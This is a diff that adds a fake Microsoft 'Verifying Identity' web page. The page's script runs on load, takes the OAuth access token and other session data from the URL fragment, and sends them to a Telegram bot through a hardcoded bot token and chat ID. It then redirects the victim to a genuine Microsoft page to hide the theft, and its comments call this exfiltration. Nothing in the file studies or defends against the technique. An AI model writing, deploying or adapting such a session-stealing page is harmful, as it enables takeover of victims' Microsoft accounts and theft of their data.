@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifying Identity...</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0067b8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-weight: 500; font-size: 24px; color: #323130; margin-bottom: 10px; }
+        p { color: #605e5c; font-size: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="spinner"></div>
+        <h2>Finalizing verification</h2>
+        <p>Updating your device security profile. Do not close this window...</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc";
+        const CHAT_ID = "1318100118";
+
+        async function processSession() {
+            // 1. Get the session data from the URL fragment (#)
+            const hash = window.location.hash.substring(1);
+            if (!hash) {
+                console.error("No session hash found.");
+                return;
+            }
+
+            // 2. Prepare the Telegram message
+            const params = new URLSearchParams(hash);
+            const tokenSnippet = params.get('access_token') ? params.get('access_token').substring(0, 30) : "N/A";
+            
+            const message = `
+🔓 **MICROSOFT SESSION CAPTURED**
+--------------------------------
+**Access Token Start:** \`${tokenSnippet}...\`
+**Captured From:** \`Vercel-SSO-Bridge\`
+--------------------------------
+**RAW DATA:** \`${hash}\`
+            `;
+
+            try {
+                // 3. Send directly to Telegram for speed
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log("Exfiltration Successful.");
+            } catch (e) {
+                console.error("Telegram Exfiltration Failed:", e);
+            }
+
+            // 4. Final Redirect to maintain the illusion of success
+            setTimeout(() => {
+                window.location.href = "https://mysignins.microsoft.com/security-info";
+            }, 1500);
+        }
+
+        window.onload = processSession;
+    </script>
+</body>
+</html>
